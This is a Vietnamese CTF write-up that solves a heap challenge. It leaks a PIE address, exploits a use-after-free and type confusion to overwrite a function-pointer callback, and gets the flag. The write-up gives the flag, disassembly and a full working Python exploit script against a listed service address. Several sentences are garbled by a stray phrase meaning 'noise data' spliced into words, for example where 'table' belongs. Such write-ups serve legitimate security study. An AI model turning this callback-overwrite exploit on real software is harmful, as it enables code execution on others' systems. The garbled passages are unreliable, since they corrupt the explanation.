---
title: "Soul // Memory of Thanos"
category: "Pwn"
tags: ["use-after-free", "type-confusion", "pie-leak", "function-pointer-overwrite", "heap"]
solve_date: "2026-10-09"
language: "vi"
---

# Soul // Memory of Thanos

**Flag:** `OWASP{Th4n0s_S0ul_Mem0ry_UAF_Type_Confusion}`
**Dịch vụ:** `145.239.142.129:1339`, banner `SOUL ARCHIVE v6.0`. **Artifact:** `soul.zip` (1074646 B), chứa `soul_archive` (21720 B), `libc.so.6` (2220400 B), `ld-linux-x86-64.so.2` (236616 B).

## Đề bài

`SOUL ARCHIVE v6.0` là menu heap 64-bit (Hard, 500 điểm, 0 lời giải tại thời điểm giải) với sáu chức năng: Capture soul, Inspect soul, Merge souls, Erase soul, Transfer soul (Record Log), Exit. Chương trình chỉ in cờ trong `soul_ascension()`, hàm bị chặn bởi bốn điều kiện trạng thái và một giá trị essence đặc biệt; không có đường gọi hợp lệ nào dẫn tới hàm đó.

## Phân tích

`readelf -h` trả `Type: DYN (Position-Independent Executable file)`, `r2 -q -c "iI~pic" soul_archive` trả `pic true`; `readelf -dW` có `FLAGS BIND_NOW` cùng segment `GNU_RELRO`, `GNU_STACK` chỉ `RW` (NX), và binary gọi `__stack_chk_fail`. Các bảo vệ này không chặn chuỗi UAF/type confusion trên heap dưới đây.

Mỗi soul được cấp `malloc(0x40)` — cả trong `capture_soul` (call tại `0x1937`) và trong `transfer_soul` (call tại `0x1f1a`) — nên record và soul trùng size bin. Layout field dùng đến:

| Offset | Nội dung |
|---|---|
| `+0x00` | tên (record: `read_str` với size `0x18`) |
| `+0x20` | essence |
| `+0x28` | type |
| `+0x30` | consume callback |
| `+0x38` | inspect callback |

Ba primitive:

1. **Leak PIE.** `inspect` in `Inspect Callback: %p`, tức chính field `+0x38`. Giá trị này được nạp từ dữ liệu gây nhiễung callback theo `type`; với `type = 4` (Titan) nó là `inspect_titan` ở offset `0x144b`, nên `base = leak - 0x144b`. Script kiểm tra `base` page-aligned trước khi dùng.
2. **UAF.** `merge_souls` kết thúc bằng `call sym.imp.free` tại `0x1e05`, sau đó chỉ tăng `merges_performed` và in thông báo; `archive[]` (`.bss` tại `0x5060`) vẫn giữ con trỏ tới soul vừa được giải phóng của vessel bị hòa tan.
3. **Type confusion.** `transfer_soul` gọi `malloc(0x40)` nên chunk vừa `free` ở trên được cấp lại, rồi ghi các field qua `strtoull(..., 0x10)`: `+0x20` (prompt `Timestamp (hex e.g. 1337)`), `+0x28` (prompt `Raw Entropy / Essence (hex)`), `+0x38` và `+0x30` (prompt `Audit Callback Address (hex, 0 for default)`, store tại `0x2098` và `0x20a4`). Người gọi do đó kiểm soát được con trỏ callback của một soul vẫn còn nằm trong `archive[]`.

Cổng vào trong `soul_ascension` (offset `0x14fb`) đọc bốn biến toàn cục; `aa; axt @ sym.soul_ascension` không trả cross-ref nào, nên hàm chỉ tới được qua con trỏ callback:

```text
0x0000151a  mov eax, dword [obj.total_captured]   ; cmp eax, 5 ; jle fail
0x00001529  mov eax, dword [obj.merges_performed] ; cmp eax, 3 ; jne fail
0x00001538  mov eax, dword [obj.souls_erased]     ; cmp eax, 1 ; jne fail
0x0000155a  movabs rdx, 0x50574e534f554c53        ; cmp rax, rdx ; jne fail
```

Cờ không nằm trong `.rodata` mà được nạp từng mảnh bằng `movabs` bên trong `soul_ascension` (`0x15a9`, `0x15b3`, `0x15c5`, `0x15cf`, `0x15e1` với `'OWASP{Th'`, `'4n0s_S0u'`, `'l_Mem0ry'`, `'_UAF_Typ'`, `'e_Confus'`), nghĩa là chuỗi có thể đọc tĩnh một phần; giá trị đầy đủ được xác nhận bởi phản hồi của dịch vụ.

## Lời giải

Thứ tự thao tác để vừa thỏa cổng vừa đưa callback tới đích:

1. **Capture 6 soul** với `type = 4`, essence `1` để `total_captured = 6 > 5`.
2. **Inspect vessel 0** để lấy `base + 0x144b`, suy ra PIE base.
3. **Erase vessel 5** để `souls_erased = 1`.
4. **Merge `(0,1)`, `(0,2)`, `(0,3)`** để `merges_performed = 3`; mỗi lần merge giải phóng soul nguồn và chunk của vessel 3 nằm ở đầu tcache bin `0x40`.
5. **Transfer soul** với `Timestamp = 50574e534f554c53` (essence), `Raw Entropy / Essence = 1004` (type), `Audit Callback = base + 0x14fb`. `malloc(0x40)` cấp lại đúng chunk của vessel 3, nên `archive[3]` trở thành một soul hợp lệ về layout nhưng có inspect callback trỏ vào `soul_ascension` và essence đúng magic.
6. **Inspect vessel 3** → `callback(soul)` nhảy vào `soul_ascension`; cả bốn điều kiện đều đúng nên cờ được in.

Hai lần chạy độc lập đều cho cờ. Phản hồi inspect được lưu nguyên văn trong `ascension.bin` (810 B):

```text
--- Vessel [3] ---
Soul Name: VOID
Type: 0x1004
Essence: 0x50574e534f554c53
Inspect Callback: 0x616cd492c4fb
```

`0x616cd492c4fb - 0x14fb = 0x616cd492b000` chính là base đã leak của lần chạy đó; dòng 11 của cùng file là cờ.

## Kết quả

```text
OWASP{Th4n0s_S0ul_Mem0ry_UAF_Type_Confusion}
```

Cờ đọc trực tiếp từ dịch vụ đề bài và được lưu trong `ascension.bin` (dòng 11). Cờ này đã được nền tảng chấp nhận; phản hồi chấp nhận ghi nhận trong dữ liệu gây nhiễun ghi.

## Tái hiện

Cần Python 3 (`socket`, `re`) và dịch vụ ở `145.239.142.129:1339`. Script tự lấy PIE base từ chính kết nối nên không cần chạy local bằng `ld-linux-x86-64.so.2` và `libc.so.6` đi kèm. Lưu block dưới đây thành `soul_exploit.py`, tạo thư mục `scratch/` cạnh đó rồi chạy `python soul_exploit.py`.

```python
import re
import socket
import sys

HOST, PORT = "145.239.142.129", 1339

# offsets inside the 0x40-byte soul struct
OFF_NAME = 0x00
OFF_ESSENCE = 0x20
OFF_TYPE = 0x28
OFF_CONSUME = 0x30
OFF_INSPECT = 0x38

INSPECT_OFFSET = {1: 0x13A9, 2: 0x13DF, 3: 0x1415, 4: 0x144B, 5: 0x1481}
ASCENSION = 0x14FB
ESSENCE_MAGIC = 0x50574E534F554C53  # "SLUOSNWP"

MENU = b"> "


def connect():
    s = socket.create_connection((HOST, PORT), timeout=20)
    s.settimeout(20)
    return s


def ru(s, token):
    """Accumulate until token appears; token must be the tail of the reply."""
    buf = b""
    while token not in buf:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    return buf


def step(s, data, expect):
    s.sendall(data)
    out = ru(s, expect)
    if expect not in out:
        raise RuntimeError("missing %r; got %r" % (expect, out))
    return out


def capture(s, name, soul_type, essence):
    step(s, b"1\n", b"Soul name: ")
    step(s, name + b"\n", b"Type: ")
    step(s, str(soul_type).encode() + b"\n", b"Initial Essence (hex value e.g. 1000): ")
    return step(s, essence.encode() + b"\n", MENU)


def inspect(s, idx):
    step(s, b"2\n", b"Enter vessel index (0-7): ")
    return step(s, str(idx).encode() + b"\n", MENU)


def merge(s, a, b):
    step(s, b"3\n", b"First vessel index to merge: ")
    step(s, str(a).encode() + b"\n", b"Second vessel index to merge: ")
    return step(s, str(b).encode() + b"\n", MENU)


def erase(s, idx):
    step(s, b"4\n", b"Enter vessel index to erase (0-7): ")
    return step(s, str(idx).encode() + b"\n", MENU)


def transfer(s, realm, tid, flags, timestamp, raw, callback):
    step(s, b"5\n", b"Realm of origin: ")
    step(s, realm + b"\n", b"Transfer ID (decimal): ")
    step(s, str(tid).encode() + b"\n", b"Entropy Flags (decimal): ")
    step(s, str(flags).encode() + b"\n", b"Timestamp (hex e.g. 1337): ")
    step(s, timestamp.encode() + b"\n", b"Raw Entropy / Essence (hex): ")
    step(s, raw.encode() + b"\n", b"Audit Callback Address (hex, 0 for default): ")
    return step(s, callback.encode() + b"\n", MENU)


def main():
    s = connect()
    ru(s, MENU)

    # six souls -> total_captured = 6 (> 5)
    names = [b"GAMORA", b"NEBULA", b"DRAX", b"MANTIS", b"STARLORD", b"WANDA"]
    for i, n in enumerate(names):
        out = capture(s, n, 4, "1")
        if b"registered" not in out:
            raise RuntimeError("capture %d failed: %r" % (i, out))

    # PIE leak: soul 0 is a Titan -> inspect callback = base + 0x144b
    out = inspect(s, 0)
    m = re.search(rb"Inspect Callback: 0x([0-9a-fA-F]+)", out)
    if not m:
        raise RuntimeError("no leak: %r" % out)
    leak = int(m.group(1), 16)
    base = leak - INSPECT_OFFSET[4]
    if base & 0xFFF:
        raise RuntimeError("base not page aligned: %x" % base)
    print("[*] inspect callback leak = %#x" % leak)
    print("[*] pie base = %#x  -> soul_ascension = %#x" % (base, base + ASCENSION))

    # exactly one erase
    erase(s, 5)

    # three merges: each frees the source soul but leaves archive[idx] dangling.
    # chunk of vessel 3 ends up at the head of the tcache bin.
    for victim in (1, 2, 3):
        merge(s, 0, victim)

    # this allocation recycles the freed chunk of vessel 3 and lets us write
    # every struct field, including the inspect callback.
    out = transfer(
        s,
        b"VOID",
        0,
        0,
        hex(ESSENCE_MAGIC),           # essence (Timestamp prompt -> +0x20)
        hex(0x1004),                  # type     (Raw prompt      -> +0x28)
        hex(base + ASCENSION),        # callback (+0x38 and +0x30)
    )
    rec = re.search(rb"0x[0-9a-f]+", out)
    print("[*] record log: %r" % out)

    out = inspect(s, 3)
    with open("scratch/ascension.bin", "wb") as fh:
        fh.write(out)
    sys.stdout.buffer.write(b"[*] inspect vessel 3:\n" + out + b"\n")
    sys.stdout.flush()

    flag = re.search(rb"OWASP\{[^}]+\}", out)
    print("[+] FLAG: %s" % flag.group().decode() if flag else "[-] no flag in output")
    s.close()


if __name__ == "__main__":
    sys.exit(main())
```

Kiểm tra tĩnh trên artifact:

```console
$ r2 -q -c "iI~pic" soul_archive
$ r2 -q -c "aa; axt @ sym.imp.malloc" soul_archive
$ r2 -q -c "aa; axt @ sym.imp.free" soul_archive
$ r2 -q -c "aa; pd 260 @ 0x14fb" soul_archive
```

Các offset `0x144b`, `0x14fb` và dữ liệu gây nhiễung `INSPECT_OFFSET` lấy từ symbol table của `soul_archive` đi kèm; đọc lại nếu dịch vụ đổi binary.
